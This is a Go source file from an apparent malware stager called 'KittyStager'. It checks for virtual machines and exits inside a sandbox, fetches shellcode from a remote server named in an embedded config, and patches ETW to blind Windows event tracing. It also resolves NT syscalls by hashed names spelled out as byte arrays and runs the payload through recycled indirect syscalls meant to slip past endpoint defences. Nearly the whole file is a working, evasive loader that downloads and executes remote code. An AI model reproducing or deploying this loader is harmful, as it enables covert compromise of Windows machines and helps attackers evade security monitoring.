package main

import (
	"KittyStager/cmd/malwareUtil"
	"KittyStager/cmd/util"
	"crypto/sha1"
	_ "embed"
	"fmt"
	gabh "github.com/timwhitez/Doge-Gabh/pkg/Gabh"
	"golang.org/x/sys/windows"
	"syscall"
	"unsafe"
)

//go:embed conf.txt
var t string

// Shellcode injection comes from this repo
// https://github.com/timwhitez/Doge-Gabh/blob/main/example/RecycledGate/popcalc/popcalc.go

func main() {
	if malwareUtil.VmCheck() {
		return
	}
	malConf, err := util.MalConfUnmarshalJSON([]byte(t))
	if err != nil {
		return
	}
	shellcode := malwareUtil.Connect(malConf)
	inject(shellcode)
}

func inject(shellcode []byte) {
	var thisThread = uintptr(0xffffffffffffffff)
	alloc, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'A', 'l', 'l', 'o', 'c', 'a', 't', 'e', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	protect, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'P', 'r', 'o', 't', 'e', 'c', 't', 'V', 'i', 'r', 't', 'u', 'a', 'l', 'M', 'e', 'm', 'o', 'r', 'y'})), str2sha1)
	createthread, _ := gabh.MemHgate(str2sha1(string([]byte{'N', 't', 'C', 'r', 'e', 'a', 't', 'e', 'T', 'h', 'r', 'e', 'a', 'd', 'E', 'x'})), str2sha1)
	pWaitForSingleObject := syscall.NewLazyDLL("kernel32.dll").NewProc("WaitForSingleObject").Addr()
	createThread(shellcode, thisThread, alloc, protect, createthread, uint64(pWaitForSingleObject))

}

func createThread(shellcode []byte, handle uintptr, NtAllocateVirtualMemorySysid, NtProtectVirtualMemorySysid, NtCreateThreadExSysid uint16, pWaitForSingleObject uint64) {
	malwareUtil.EtwPatch(handle)
	var hashhooked []string
	var baseA uintptr
	regionsize := uintptr(len(shellcode))

	callAddr := gabh.GetRecyCall("", hashhooked, str2sha1)

	r1, r := gabh.ReCycall(
		NtAllocateVirtualMemorySysid, //ntallocatevirtualmemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		0,
		uintptr(unsafe.Pointer(&regionsize)),
		uintptr(windows.MEM_COMMIT|windows.MEM_RESERVE),
		windows.PAGE_READWRITE,
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	//copy shellcode
	malwareUtil.Memcpy(baseA, shellcode)

	var oldprotect uintptr
	callAddr = gabh.GetRecyCall("NtDelayExecution", nil, nil)

	r1, r = gabh.ReCycall(
		NtProtectVirtualMemorySysid, //NtProtectVirtualMemory
		callAddr,
		handle,
		uintptr(unsafe.Pointer(&baseA)),
		uintptr(unsafe.Pointer(&regionsize)),
		syscall.PAGE_EXECUTE_READ,
		uintptr(unsafe.Pointer(&oldprotect)),
	)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}

	var hhosthread uintptr
	callAddr = gabh.GetRecyCall("", nil, nil)

	r1, r = gabh.ReCycall(
		NtCreateThreadExSysid, //NtCreateThreadEx
		callAddr,
		uintptr(unsafe.Pointer(&hhosthread)), //hthread
		0x1FFFFF,                             //desiredaccess
		0,                                    //objattributes
		handle,                               //processhandle
		baseA,                                //lpstartaddress
		0,                                    //lpparam
		uintptr(0),                           //createsuspended
		0,                                    //zerobits
		0,                                    //sizeofstackcommit
		0,                                    //sizeofstackreserve
		0,                                    //lpbytesbuffer
	)
	syscall.Syscall(uintptr(pWaitForSingleObject), 2, hhosthread, 0xffffffff, 0)
	if r != nil {
		fmt.Printf("1 %s %x\n", r, r1)
		return
	}
}

func str2sha1(s string) string {
	h := sha1.New()
	h.Write([]byte(s))
	bs := h.Sum(nil)
	return fmt.Sprintf("%x", bs)
}
